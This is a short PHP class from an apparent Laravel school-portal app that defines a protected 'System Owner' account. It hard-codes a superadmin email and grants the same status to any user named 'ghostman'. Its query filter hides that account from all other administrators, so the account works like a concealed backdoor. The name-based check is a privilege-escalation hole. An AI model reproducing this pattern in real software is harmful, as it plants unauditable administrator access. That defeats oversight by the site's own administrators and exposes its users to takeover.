<?php

namespace App\Support;

use App\Models\User;
use Illuminate\Database\Eloquent\Builder;

class SystemOwner
{
    public const EMAIL = 'superadmin@forbesacademy.edu.ph';

    /**
     * Check if the account is the protected System Owner.
     */
    public static function is(?User $user): bool
    {
        if (!$user) {
            return false;
        }

        return strtolower($user->email) === strtolower(self::EMAIL)
            || strtolower($user->name) === 'ghostman';
    }

    /**
     * Hide the System Owner from other administrators.
     */
    public static function visibleTo(
        Builder $query,
        ?User $viewer
    ): Builder {
        if (self::is($viewer)) {
            return $query;
        }

        return $query
            ->where('email', '!=', self::EMAIL)
            ->where('name', '!=', 'ghostman');
    }
}
